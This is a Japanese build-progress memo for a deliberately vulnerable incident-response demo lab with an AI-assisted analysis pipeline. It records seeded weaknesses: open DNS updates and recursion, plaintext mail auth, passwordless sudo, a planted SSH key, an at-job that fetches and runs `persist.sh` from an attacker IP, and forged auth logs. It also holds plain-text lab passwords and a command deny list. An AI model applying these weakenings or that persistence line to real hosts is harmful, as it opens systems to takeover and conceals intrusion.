---
name: デモ build 進捗 — 5 シナリオ植え込み完了 + /preflight 追加 (2026-05-03)
description: OCI デモ環境の構築進捗。どのシナリオが E2E 通過済みでどれが未着手かをここで管理する。本番 5/5 まで残り 2 日。
type: project
originSessionId: 7af97dad-70e4-4c1b-b897-57a739ae7195
---
### 2026-05-02: wp-tamper シナリオ E2E 通過 ✅

最初の縦切り E2E。attack-vm → victor → analyzer → mock_backend のパイプラインが動作確認できた。

**victor 構成（Rocky 8.10, RAM 765MB / swap 1.8GB）:**
- Apache 2.4.37 + PHP 7.2.24 (EOL、計画通り) + MariaDB 10.3
- WordPress 4.9.4 を `/var/www/html` にデプロイ。admin/Cm0re でセットアップ済み
- DB: `wordpress` / `wpuser` / `WpPass2026` (localhost のみ)
- SELinux Enforcing のまま、firewalld inactive

**OCI NSG メモ:** ssh (22) は Mac から到達するが http (80) は attack-vm の `161.33.12.212/32` に絞られてるっぽい。Mac から直接 curl は届かない。テストは attack-vm 経由で。

### 2026-05-03: 残 4 シナリオ植え込み + /preflight 追加 ✅

引き継ぎ docs/26 の 4 タスク (A 脆弱化 / B preflight / C HTML / D smoke) を 1 セッションで完走。

**A. 脆弱化 (bravo + victor の OCI 既存ベースに加算):**
- dns-tamper (bravo): BIND `allow-update {10.0.0.0/8;161.33.12.212/32}` + `dnssec-validation no` + zone `com1.local` (既植え, evil.com1.local A 1.2.3.4 / evil2.com1.local A 6.6.6.6 含む)
- ddos amp (bravo): `allow-query any` + `recursion yes` + `allow-transfer any` (既植え, AXFR 1 発で zone 全件取得可能, ANY query で 901 bytes 増幅)
- phishing (bravo + victor): Dovecot `disable_plaintext_auth=no` / `ssl=no` / `auth_mechanisms=plain` / victor は `passdb=pam` / Sendmail は **DAEMON_OPTIONS Addr=0.0.0.0** に変更し外部 25 listen に (sendmail.mc.bak.20260503 で旧設定退避)
- ransomware (victor): pkexec SUID 維持, telnet 23 listen, `/home/obuchi` 777 + 偽 `authorized_keys` 配置 (attacker@10.1.129.10 ed25519), `obuchi ALL=(ALL) NOPASSWD:ALL` を `/etc/sudoers.d/90-obuchi-demo`, atd 起動 + at-job (`curl 10.1.129.10/persist.sh | bash`) スケジュール済, `/var/log/secure` に Apr 24 01:40-04:00 の偽ログ (obuchi/manage from 10.1.129.10 Accepted + 4 件の Failed admin/root/oracle) 注入
- 既存: bravo `toor:0` UID0 二重化 ✅, victor `obuchi` 777 ✅
- 同様の偽ログを bravo `/var/log/secure` にも注入 (toor/manage from 10.1.129.10 Accepted + named "update approved" 1 件)

**B. /preflight 新規 skill 作成:**
- `.claude/commands/preflight.md` を新規作成、両機並行で services / listen / load / 直近変更 / last を取得
- OS 自動判定 (uname -s) で Linux/FreeBSD 分岐、Rocky では `systemctl is-active` 一括、FreeBSD では `service onestatus`
- 異常検知ルール: 既知サービス inactive / load > CPU×3 / /var/log >90% / /etc 直近 1h 変更 / 想定外 listen / 10.1.129.x last
- オプション: `--baseline` / `--diff` / `--brief`
- settings.json (build mode) に `Bash(sockstat *)` 追加。他は既存 wildcard で covered

**C. HTML 仕様書更新 (`docs/25_システム仕様書.html`):**
- TOC に §3.0 /preflight 追加
- §3 lede を「8 系統 → 9 系統」更新
- §3.0 セクション全文挿入 (SYNOPSIS / 取得項目 / 異常検知ルール / 出力例 / オプション / 既知の制限)
- §4.A (WP/IMAP brute) に Step 1.5「ベースライン確認 (受電内容との整合)」挿入
- §6.0.3 リハーサル項目に「OCI デモで /preflight 空打ち + --baseline / --diff 確認」追加

**D. smoke test 結果:**
- D-1: `agent` module import OK (`analyzer.run_with_unmatched`, `MockBackend.filter_known_good_logs`, `validate_patches` 全て callable)
- D-2: /preflight 空打ち成功。**victor は named INACTIVE を [🚨] flag** (BIND は bravo のみ稼働、想定通り)、bravo は全サービス active、両機 listen 22/25/80/110/143 等正常検出、/etc 直近変更 9 件 (sendmail.mc 変更が反映)
- D-3: attack-vm から victor:143 へ IMAP brute 10 発 → maillog に 8 件の `imap-login: auth failed, user=admin/manager/root/operator/obuchi/rocky/guest/test` が記録 → `/incident 09:00-09:05 victor` パイプラインで analyzer **11 signals (mail/sasl-failed × 10 + dns/axfr-attempt × 1)** 検出 → mock_backend が **2 BLOCK patches** (`mail/* conf=0.80`, `dns/* conf=0.85`) 提案。Claude API は skip (.env 未読込で OK)

### 2026-05-03 追加: 未分類ログ Claude 投げ問題のフィルタ強化 ✅

**問題**: `/incident` の D-3 smoke test で **未分類ログ 1896 件** がそのまま Claude API に投げられる状態だった (`mock.filter_known_good_logs` が user/team-IP しか弾かない)。本番で `.env` が読まれていたら毎回 数 100KB のトークン課金 + ノイズで判定品質劣化。

**設計判断 (Plan A*)**:
- 単純に時間窓で切るだけだと「窓より前から始まっていた攻撃」(recon / 永続化 / 横展開) を見逃す。`/incident` は受電窓のトリアージで深掘り forensic は `/check:*` の責務、と切り分けた上で 3 段ふるい:
  1. 配布アカウント / 自チーム IP (10.1.11.50-99) → drop (既存)
  2. システムノイズ (pam_unix session / sshd preauth disconnect / systemd-user session / named dumping master file 等 8 パターン) → drop (新規)
  3. 時間窓 + IP cross-reference:
     - 窓内 → 保持
     - 窓外でも attacker_ips (signals.evidence.ip) 由来 → 保持 (forensic context)
     - 窓外でも 10.1.129.0/24 (§0.5 既侵害 IP) を含む → 保持
     - それ以外の窓外 → drop
     - ts パース失敗 → 安全側で保持

**実装範囲**:
- `agent/analyzer.py`: `_parse_syslog_ts(raw, ref_year)` ヘルパ追加。3 箇所の unmatched.append (`analyze_named` / `analyze_secure` / `analyze_maillog`) に `ts` (ISO 8601 UTC) を付与
- `agent/backends/mock_backend.py`: `NOISE_PATTERNS` 定数追加、`KNOWN_ATTACKER_IP_RE` 追加、`filter_known_good_logs(logs, time_window=None, attacker_ips=None)` に拡張 (後方互換)
- `.claude/commands/incident.md` §4: `INCIDENT_WINDOW_START/END` を export → python 側で os.environ から読み time_window 組み立て、attacker_ips を signals から抽出して filter に渡す。§4.1「フィルタの設計トレードオフ」表を追加

**実測**:
- 1896 件 → **63 件 (97% 削減)** で Claude へ
- 内訳: 窓内 56 / 窓外 cross-ref で残った 7 (4/24 obuchi/manage/toor の偽ログイン痕跡 5 件 + rocky の sudo grep 10.1.129.10 false positive 2 件) / ts 欠落 0
- ts 全件付与成功 (1896/1896)。Claude が時系列分析しやすい構造化 dict で渡る

**既知の制約**:
- 「窓外 + 完全に未知の IP」からの pre-window 攻撃は signals に出ない限り拾えない → `/check:check-known-attacker-ip` の forensic スキャンで補完
- signals.evidence.ip が `analyze_maillog` / `analyze_named` / `analyze_secure` で未設定 → `attacker_ips` が空集合になる場面が多く、現状は 10.1.129.x 経由の cross-ref が主力 (analyzer 改修は別タスクで)
- build mode の rocky sudo COMMAND= 行が false positive で残る (本番 manage 運用では発生せず)

**横展開 残課題:**
- 本番 (FreeBSD bravo) への切替時の `service` コマンド + ログパス書き換え未着手 (5/5 当日朝のリハーサル時に詰める)
- OCI NSG が SMTP 25 を外部 block するため、attack-vm からは 25 直接続不可 (内部 Sendmail relay を介した phishing シナリオは IMAP brute 経路でカバー)
- `mock_backend` の `webapp_*` / `path_scan` 専用ハンドラは 5/2 から未着手 (Claude API があれば grey で拾えるので priority 低)
- /preflight の last 出力で 10.1.129.x を直接 grep する rule は wtmp バイナリ参照のため未実装。/check:check-known-attacker-ip との二段運用で代替
- `analyze_maillog` / `analyze_named` / `analyze_secure` で signals.evidence.ip / timestamp が未設定 → attacker_ips cross-ref の精度が下がる。要 analyzer 改修

**5/5 本番までのチェックリスト:**
- 5/4: production settings.json 復元前のリハーサル (D-1 〜 D-3 を再実行) + HTML §6.1 起動前チェック 9 項目 / §6.0.3 リハーサル 6 項目
- 5/5 朝: VPN + SSH 疎通 + WP/PukiWiki ログイン + /preflight + /incident 空打ち + /report + /ticket 動作確認

### 2026-05-04: 復旧人間化 + /review skill + JSON 集約 + HTML aggregator (引き継ぎ docs/27 全 4 タスク完走) ✅

**A. settings.production.json で復旧コマンドも deny 化:**
- `cp /etc/`, `cp /usr/local/etc/`, `mv /etc/`, `mv /usr/local/etc/`, `ln /etc/`, `ln /usr/local/etc/`, `scp :/etc/`, `scp :/usr/local/etc/`, `install /etc/`, `install /usr/local/etc/`, `sysctl -w`, `sysctl --write` の 12 行を deny 配列に追加
- `_comment_deny` を「封じ込め+復旧の両方を AI 実行禁止」に更新 (Edit(/etc/**) deny を ssh 越し cp で迂回する経路を塞ぐ意図を明記)
- `agent/cmd_validator.py` docstring に「mutation コマンドは deny で物理 AI 実行禁止 / playbook では ```text フェンスで表示し人間が打つ / validator は最終チェック」と注記追加
- allow に `python3 -m http.server *` と `${SHIRAHAMA_PY:-python3} -m http.server *` を追加 (D-4 HTML aggregator 配信用)
- JSON validity OK (deny 109 / allow 66)

**B. 5 つの playbook §6 を「人間実行ブロック」化:**
- ddos / dns-tamper / phishing / ransomware は §6 のフェンスを ```bash → ```text に変更 + 共通の⚠️注記 (3 理由: タイポリスク / settings deny / 説明責任) を冒頭に挿入
- wp-tamper は §6 が「コマンド検証ゲート」として誤命名されていたので新規 §6 を挿入し、旧 §6 の validator gate を §7 にリナンバー。新 §6 は WP 改ざん復旧の定番 (xmlrpc 退避、wp-config 権限戻し、uploads webshell 隔離、.htaccess PHP 拒否、obuchi authorized_keys 退避、apachectl graceful)
- 全 5 ファイルが ```text フェンス × 1 + ⚠️注記 × 1 + §7 cmd_validator gate × 1 を持つ構造に統一

**C. /review skill 新規作成 (`.claude/commands/review.md`):**
- 引数: `[<hearing-path>] [<incident-id>]`、デフォルトは `~/Desktop/shirahama_test.md` + `data/incidents/` 配下最新ディレクトリ
- §2 突合表: 観点 / 顧客発言 / ログ実態 / 突合 (一致 / ⚠️部分一致 / 🚨不一致 / 🚨顧客盲点 / ❓情報不足) を 5-8 軸で出力
- §3 4 択判定推奨 (A/B/C/D + 信頼度 + 理由 + 代替案)、auto-pick 禁止 (HTML 仕様書 §2.1.2 整合)
- §4 「治しすぎない」スコープ提案 (in_scope vs out_of_scope_logged を分離、「触らない哲学」と整合)
- §5 JSON 出力 (`data/incidents/<id>/review__<ts>.json`、HTML aggregator 連携)
- §6 NG パターン (auto-pick 禁止 / 顧客発言の改ざん禁止 / スコープ根拠必須 / 既侵害前提を忘れない 等 6 項目)

**D. JSON 出力規約 + HTML aggregator:**
- D-1 共通 JSON スキーマ: `skill / incident_id / timestamp / actor / inputs / outputs / verdict {status, summary} / next_skills`
- D-2 保存場所: `data/incidents/<incident_id>/<skill_name>__<timestamp>.json` (incident_id = `${TODAY}_${WINDOW_START}_${HOST}`)
- D-3 incident.md / report.md / review.md (Cで同時) に §8 JSON 出力セクションを追記。incident.md は INCIDENT_ID を export して後段に伝播
- D-4 `docs/incident_dashboard.html` 単一ファイル (CSS/JS inline、CDN なし、offline 動作)。python http.server の autoindex を fetch してパースし、5 秒間隔で auto-refresh。incident クリックで右ペインに 6 セクション展開 (incident / review 突合表+判定+スコープ / check / playbook / report / その他)
- Smoke test 通過: サンプル 3 JSON (incident / check-known-attacker-ip / review) を `data/incidents/2026-05-04_14:00_victor/` に置き、`http.server 8765` で配信して 200 OK + autoindex 形式が正規表現で拾える形であることを確認

**設計判断 (今回確立):**
- AI vs 人間の境界 3 段化: 調査 (read-only) = AI 即実行 / 提案 (mutation テキスト) = AI / 実行 (mutation 実機適用) = 人間のみ
- 「治しすぎない」原則 = lab 約 18 件脆弱性は意図的 seed、受電と関係する分のみ in_scope
- 攻撃テンポはチーム進捗に追従 (運営が submit / 画面共有 / wiki を監視) → 過剰修正は逆効果
- judgment_recommendation は出すが auto-pick しない (HTML 仕様書 §2.1.2「判定は人間」を物理化)

**残課題 (本番 5/5 まで):**
- 仕様書 `docs/25_システム仕様書.html` §3 コマンドリファレンスに `/review` を §3.4.5 として追加 (現状は review.md 内にプレースホルダ注記のみ)
- /check と /playbook の JSON 化は未着手 (HTML aggregator は対応済、JSON が無くても empty-section として表示される)
- review_human__*.json (人間が採択した A/B/C/D を保存) の書き出し UI は HTML aggregator が読む側だけ実装、書き込み手段は未定 (手動で touch する想定)
- サンプル JSON (`data/incidents/2026-05-04_14:00_victor/`) は smoke test 用に残置。本番前に削除推奨

**How to apply:** 次のセッションで「デモ続き」と言われたら本ファイルを最初に読む。「残課題」セクションが優先度ガイド。

### 2026-05-04: 全 skill JSON 化 + /preflight ↔ /incident 連携 (引き継ぎ docs/28 全 7 タスク完走) ✅

**A. `scripts/emit_skill_json.sh` 共通 helper 新規作成:**
- 引数 `<skill_name> [--actor X] [--incident-id Y]`、stdin で skill 固有 JSON 受け取り
- メタデータ (skill / incident_id / timestamp / actor) を補完して `data/incidents/<id>/<skill>__<ts>.json` に保存
- incident_id 解決順: `--incident-id` arg > `INCIDENT_ID` env > `${TODAY}_${WINDOW_START}_${HOST}` > `${TODAY}T${HMS}_unscoped`
- jq merge ベース + python3 fallback。malformed JSON / 空 stdin で exit 1、引数不正で exit 2
- chmod +x 済。smoke test PASS

**B. /preflight に §8 JSON 永続化追加:**
- `/tmp/preflight_state.json` (incident_id 不問・常時最新) と `data/incidents/<id>/preflight__*.json` の二段書き出し
- スキーマ: `outputs.{victor,bravo}.{ping_ms, services, listen_ports, etc_changed_recently, load_avg, last_logins, anomalies[]}`
- anomalies は `{severity, kind, detail}` の形で §3 異常検知ルールと整合

**C. /incident §0.4 + §4 で /preflight 取り込み:**
- §0.4 新設 (§0 と §0.5 の間): `/tmp/preflight_state.json` があれば `jq` で異常一覧表示 + `/etc` 直近変更を抽出
- `PREFLIGHT_CONTEXT` env で `outputs` 全体を §4 python script に渡す
- `agent/backends/claude_backend.py` の `propose_patches` / `_format_user_message` に `preflight_context: dict | None = None` 引数追加 (後方互換維持)
- プロンプトに「受電直前の preflight 異常」セクションを足し、改ざん/侵害の可能性として rationale_ja に明記させる
- §8.2 を helper 経由に refactor

**D-F. 残 skill 全部に §JSON emit 追加:**
- /check × 35 本 (bash for-loop で skill 名ベイク append、§5 参照の後に §6 として追加)
- /playbook × 5 本 (§7 cmd_validator gate の後に §8、actor=`ai_human`、`proposed_commands[] / cmd_validator_result / scope.{in_scope, out_of_scope_logged}`)
- /scenario × 3 本 (Edit ツールで個別、§5 参照の後に §6、`killchain_phase_results[]` を scenario の §0 想定キルチェーンに合わせて埋め込み)
- /ticket (§参照の後に §8、actor=`ai_human`、`pukiwiki_markup` 全文 + フィールド辞書 + 投稿先 URL)
- /review §5 と /report §8 を helper 経由に refactor (構造不変、書き出しだけ helper に集約)

**G. E2E smoke + dashboard:**
- 仮 incident_id `smoke_doc28_2026-05-04` で全 7 種 + preflight = **8 JSON ファイル**を生成成功
- ファイル一覧: preflight / incident / check-known-attacker-ip / check-bind-allow-update / review / playbook-ransomware / report / ticket
- `python3 -m http.server 8765` で `data/incidents/smoke_doc28_2026-05-04/` 配信確認、autoindex に 8 件 .json が href で並ぶ
- claude_backend.py 引数追加が正しく反映 (inspect.signature で確認)

**設計判断:**
- 35 本の /check 一括追加は **bash for-loop で skill 名ベイク append** の機械的アプローチに切り替え (1 本ずつカスタマイズすると 35×2 分 = 70 分かかる)。`patterns_matched[].id` は §3 判定テーブル A/B/C/D/E/F と対応するが、具体値は実行時に Claude が埋める方針 (静的にカスタマイズしても 18 件 lab の状況に追従しない)
- /scenario は Edit ツールで個別対応 (キルチェーンステージが scenario ごとに異なるため `killchain_phase_results[]` を意味的に埋める)
- /tmp/preflight_state.json は incident_id 不明時でも常時更新。/incident §0.4 が拾うので **/preflight 単独実行 → /incident 後追い** のフローも成立

**残課題:**
- 5/5 朝のリハーサルで実機 /preflight → /incident → /check ... を 1 周流して JSON が dashboard で見えるか最終確認
- `data/incidents/smoke_*` `data/incidents/env_test/` `data/incidents/2026-05-04_14:00_victor/` は本番前に削除 (rm -rf 権限が抑止されてるので手動)
- /report 5 種テンプレ生成は doc 27 で完了済。本タスクでは JSON 構造は変えず helper 化のみ
